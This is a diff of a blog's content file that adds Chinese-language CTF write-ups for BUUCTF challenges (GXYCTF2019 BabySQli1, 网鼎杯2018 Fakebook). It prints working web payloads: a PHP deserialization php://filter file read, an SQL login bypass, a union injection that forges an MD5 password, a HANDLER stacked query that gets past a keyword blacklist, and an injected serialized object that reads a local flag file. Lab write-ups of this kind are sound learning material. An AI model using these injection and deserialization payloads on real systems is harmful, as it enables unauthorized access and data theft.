@@ -194,6 +194,34 @@ printf(serialize($c));
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>变量属性是protected，它在序列化后会出现不可见字符%00*%00，可以在变量前输入\00*\00</p>
+<h1 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a>[GXYCTF2019]BabySQli1</h1><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>username:admin’ or ‘1’=’1’#</p>
+<p>1’union select 1,2,3#&amp;pw=3  试完之后说wrong pass，查看源码之后知道</p>
+<h2 id="base32加密"><a href="#base32加密" class="headerlink" title="base32加密"></a>base32<strong>加密</strong></h2><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+<p>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</p>
+<p>select * from user where username = ‘$name’</p>
+<p>对$name注入没有问题，后台储存密码一般是以md5的方式进行加密</p>
+<p>1.-1‘union select 1,2,3#&amp;pw=3</p>
+<p>提示wrong user</p>
+<p>2.-1’union select 1,’admin’,3#pw=3</p>
+<p>wrong pass</p>
+<p>3.1’union select 1,’admin’,’eccbc87e4b5ce2fe28308fd9f2a7baf3’#&amp;pw=3</p>
+<p>id,admin,password</p>
+<p>提示密码错误，而后台一般以md5的方式存密码，123456加密后输入即可</p>
+<p>第三例为密码，因此要采用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;varchar(100)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag可能存在这个表里面，但是select与set、alter等众多关键词都被黑名单掉了，这里要利用HANDLER</p>
+<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</p>
+<p>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p>
+<p>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
+<p>HANDLER的详细使用方法</p>
+<p>3.最终payload<br>1’;handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#<br>1<br>获得flag</p>
+<h1 id="网鼎杯-2018-Fakebook1"><a href="#网鼎杯-2018-Fakebook1" class="headerlink" title="[网鼎杯 2018]Fakebook1"></a>[网鼎杯 2018]Fakebook1</h1><p>先尝试了登录，没有登上去，于是注册了一个，在页面中没有找到注入点，看了wp知道，要善于观察url,id=1便是注入点，</p>
+<p>id=1 order by 4#   得出列数为4</p>
+<p>id=1 union/**/select 1,2,3,4#   z注入点在二的位置上</p>
+<p>然后正常联合注入走</p>
+<p><a href="http://dac18e7d-40ea-457c-8f23-e285a3e999e3.node4.buuoj.cn:81/view.php?no=-1">http://dac18e7d-40ea-457c-8f23-e285a3e999e3.node4.buuoj.cn:81/view.php?no=-1</a> union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:18;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p>
+<p>第四列异常，应该是注入点</p>
 ]]></content>
       <categories>
         <category>buuctf</category>
@@ -346,6 +374,7 @@ printf(serialize($c));
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(),least()</span><br><span class="line">strcmp(str1,str2),第一个参数小于第二个参数，返回-1，否则为1</span><br><span class="line">in，between a and b</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>参考文章：<a href="https://blog.csdn.net/weixin_44940180/article/details/107717511?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_paycolumn_v2&utm_relevant_index=1">(43条消息) SQL注入–绕过技巧_雪碧可乐_的博客-CSDN博客_sql注入绕过</a></p>
+<p><a href="https://blog.csdn.net/fastergohome/article/details/102514160">(44条消息) CTF 中的 SQL 注入总结_重新启程-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>sql</category>
